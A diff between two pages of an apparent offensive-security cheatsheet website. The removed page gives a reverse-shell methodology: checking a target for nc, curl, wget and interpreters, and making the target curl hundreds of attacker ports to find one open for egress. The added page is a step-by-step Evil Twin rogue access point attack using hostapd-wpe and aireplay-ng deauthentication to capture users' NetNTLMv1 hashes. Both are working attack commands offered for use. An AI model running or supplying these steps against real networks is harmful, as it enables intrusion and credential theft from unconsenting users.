@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-10-06T12:58:10 CEST">
-<title>Methodology :: Offensive Security Cheatsheet</title>
+<meta name="revised" content="2019-10-06T12:58:12 CEST">
+<title>Rogue AP Attack :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -23,7 +23,7 @@
 
     
   </head>
-  <body data-url="/shells-methods/methodology/">
+  <body data-url="/wireless/rogue_ap/">
     
       <header>
   <div class="logo">
@@ -814,14 +814,13 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/shells-methods/" class="dd-item parent haschildren
+    <li data-nav-id="/shells-methods/" class="dd-item haschildren
         ">
       <div>
-      <a href="/shells-methods/">Shells methods</a>
-            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/shells-methods/">Shells methods</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
-      <li data-nav-id="/shells-methods/methodology/" class="dd-item active">
+      <li data-nav-id="/shells-methods/methodology/" class="dd-item">
         <div>
           <a href="/shells-methods/methodology/">
             Methodology
@@ -1257,10 +1256,11 @@
     </li>
         </ul>
     </li>
-    <li data-nav-id="/wireless/" class="dd-item haschildren
+    <li data-nav-id="/wireless/" class="dd-item parent haschildren
         ">
       <div>
-      <a href="/wireless/">Wireless</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+      <a href="/wireless/">Wireless</a>
+            <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
       </div>
         <ul>
       <li data-nav-id="/wireless/wifi_cracking/" class="dd-item">
@@ -1270,7 +1270,7 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/wireless/rogue_ap/" class="dd-item">
+      <li data-nav-id="/wireless/rogue_ap/" class="dd-item active">
         <div>
           <a href="/wireless/rogue_ap/">
             Rogue AP Attack
@@ -1302,14 +1302,7 @@
     <option value="/network/" >
    Network</option>
     <option value="/shells-methods/" >
-   Shells methods</option> 
-      <option value="/shells-methods/methodology/"  selected>- Methodology</option>
-      <option value="/shells-methods/tty_full/" >- Fully Interactive TTY Shell</option>
-      <option value="/shells-methods/webshell/" >- Webshell</option>
-      <option value="/shells-methods/reverse/" >- Reverse Shell</option>
-      <option value="/shells-methods/bind/" >- Bind Shell</option>
-      <option value="/shells-methods/windows/" >- Windows Shells Methods</option>
-  
+   Shells methods</option>
     <option value="/windows-systems/" >
    Windows Systems</option>
     <option value="/linux-systems/" >
@@ -1323,7 +1316,10 @@
     <option value="/pwn/" >
    Pwn</option>
     <option value="/wireless/" >
-   Wireless</option>
+   Wireless</option> 
+      <option value="/wireless/wifi_cracking/" >- WiFi Cracking</option>
+      <option value="/wireless/rogue_ap/"  selected>- Rogue AP Attack</option>
+  
 
 
 
@@ -1346,74 +1342,63 @@
       </div>
     
 
-    <h1>Methodology</h1>
+    <h1>Rogue AP Attack</h1>
     
     
     
     
 
-<h3 id="gold-command">GOLD COMMAND</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># which is gold command</span>
-which which ls find python python3 perl bash sh dash xterm php jsp java asp socat<span style="color:#8045ff">\
-</span><span style="color:#8045ff"></span>nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh </code></pre></div>
+<h3 id="general-informations">General Informations</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you need several external eth interfaces, connect then at the beginning</span>
+<span style="color:#75715e"># To ensure having wlan0 and wlan1</span>
+<span style="color:#75715e"># And avoid having wlan0mon and then wlan0 when you connect the second one</span>
+<span style="color:#75715e"># It could result in conflicts</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Evil Twin / Hostapd-wpe is used against MSCHAPv2 access points, usually used by companies</span>
+<span style="color:#75715e"># Manually creating a rogue AP for classical WPA/WPA2 requires more configuration</span></code></pre></div>
 <p><br/></p>
 
-<h3 id="methodology">Methodology</h3>
+<h3 id="evil-twin-attack">Evil Twin attack</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 1/ Start monitoring mode</span>
+<span style="color:#75715e"># If you plan to use deauth attack, connect the 2 eth interfaces at the same time</span>
+<span style="color:#75715e"># To avoid having wlan0mon and wlan0 (it can conflict)</span>
+sudo airmon-ng start wlan0
 
-<pre><code>_ Keep it simple, test for very basic things.
-|
-|
-|________ Which languages are interpreted by the servers, try to upload some simple echo
-|        |
-|        |
-|        |____ Found php ? Check echo about system, passthru, shell_exec, exec to see if you can use them
-|
-|
-|________ Check commons binaries available on the system using which, locate, or by searching binaries 
-         | at /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin
-|        |
-|        |
-|        |____ which which ls find python perl bash sh dash xterm php jsp java asp socat nc ncat 
-               netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh
-|
-|
-|
-|________ Try to get a reverse shell at port 443, then 80, if not working
-|        |
-|        |
-|        |
-|        |____ Open 2000 ports on your server using nc
-|        | for port in {1..2000};do nc -nlvp $port &amp;;done
-|        |
-|        |
-|        |____ Ask the target server to connect to those ports
-|        |   for port in {1..2000};do curl -X GET http://IP:$port/acknak
-|        |         2&gt;&amp;1;done
-|        |
-|        |
-|        |
-|        |____ Repeat until you iterated all ports
-|        |
-|        |
-|        |
-|        |____ Reverse Shell on the port you've been hit
-|
-|                                                                                                      
-|
-|
-|________ Still not working ? Go bind shell
-         |
-         |
-         |_____ Test port 443, 80, then try the nc opening ports tricks by swapping the server/client role
-</code></pre>
+<span style="color:#75715e"># 2/ If process are blocking the monitoring mode, kill them</span>
+sudo airmon-ng check <span style="color:#111">kill</span>
+sudo <span style="color:#111">kill</span> &lt;PID&gt;
+
+<span style="color:#75715e"># 3/ Get the target AP (ESSID)</span>
+<span style="color:#75715e"># Your target can have multiples AP, and so multiples MAC addresses</span>
+<span style="color:#75715e"># They can run on differents channels</span>
+sudo airodump wlan0mon
+
+<span style="color:#75715e"># 4/ Then set the target in the configuration file</span>
+sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
+<span style="color:#111">ssid</span><span style="color:#f92672">=</span>&lt;ESSID&gt;
+
+<span style="color:#75715e"># 5/ Start AP</span>
+<span style="color:#75715e"># You will only get people that newly connects to the target AP</span>
+<span style="color:#75715e"># If you want to get people already connected, you need to push the attack further with deauth</span>
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+
+<span style="color:#75715e"># 6/ Start the second ethernet interface</span>
+sudo airmon-ng start wlan1
+
+<span style="color:#75715e"># 7/ Deauth (In another terminal)</span>
+<span style="color:#75715e"># Based on the differents ESSID and channels found in step 3</span>
+<span style="color:#75715e"># -0 is the number of deauth packet sent</span>
+sudo aireplay-ng -0 <span style="color:#ae81ff">10</span> -a &lt;mac address&gt; -c &lt;channel&gt;
+
+<span style="color:#75715e"># Then wait for credz \o/</span>
+<span style="color:#75715e"># You will probably get NetNTLMv1 hashes you will need to crack</span></code></pre></div>
+<p><br/></p>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/shells-methods/" title="Shells methods"> <i class="fa fa-chevron-left"></i><label>Shells methods</label></a>
-    <a class="nav nav-next" href="/shells-methods/tty_full/" title="Fully Interactive TTY Shell" style="margin-right: 0px;"><label>Fully Interactive TTY Shell</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/wireless/wifi_cracking/" title="WiFi Cracking"> <i class="fa fa-chevron-left"></i><label>WiFi Cracking</label></a>
+    <a class="nav nav-next" href="/wireless/wifi_cracking/" title="WiFi Cracking" style="margin-right: 0px;"><label>WiFi Cracking</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -1430,7 +1415,7 @@ which which ls find python python3 perl bash sh dash xterm php jsp java asp soca
 
     
     <div class="github-link">
-      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Shells%20Methods/Methodology.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://github.com/vjeantet/hugo-theme-docdock/edit/master/exampleSite/content/Wireless/Rogue_AP.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
